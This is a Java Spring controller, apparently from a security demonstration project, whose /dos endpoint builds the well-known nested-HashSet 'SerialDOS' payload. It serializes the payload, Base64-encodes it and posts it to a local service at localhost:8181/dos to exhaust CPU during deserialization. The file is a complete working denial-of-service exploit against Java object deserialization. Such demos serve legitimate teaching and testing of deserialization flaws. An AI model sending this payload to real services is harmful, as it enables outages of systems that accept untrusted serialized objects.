package com.defensepoint.rce.controller;

import org.springframework.http.HttpEntity;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.client.RestTemplate;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.Base64;
import java.util.HashSet;
import java.util.Set;

@RestController
public class DosController {

    @GetMapping("/dos")
    public String dos() throws IOException {

        Set<Object> dosHashSet = getDosHashSet();

        // serializing the HashSet object
        byte[] bytes;
        ByteArrayOutputStream bout = new ByteArrayOutputStream();
        ObjectOutputStream oout = new ObjectOutputStream(bout);
        oout.writeObject(dosHashSet);
        oout.flush();

        bytes = bout.toByteArray();
        String output = new String(Base64.getEncoder().encode(bytes));

        HttpEntity<String> entity = new HttpEntity<>(output);
        RestTemplate restTemplate = new RestTemplate();
        ResponseEntity<String> response = restTemplate.postForEntity("http://localhost:8181/dos", entity, String.class);

        return response.getBody();
    }

    private Set<Object> getDosHashSet() {
        Set<Object> dosHashSet = new HashSet<>();
        Set<Object> s1 = dosHashSet;
        Set<Object> s2 = new HashSet<>();
        for (int i = 0; i < 100; i++) {
            Set<Object> t1 = new HashSet<>();
            Set<Object> t2 = new HashSet<>();
            t1.add("foo");
            s1.add(t1);
            s1.add(t2);
            s2.add(t1);
            s2.add(t2);
            s1 = t1;
            s2 = t2;
        }

        return dosHashSet;
    }
}
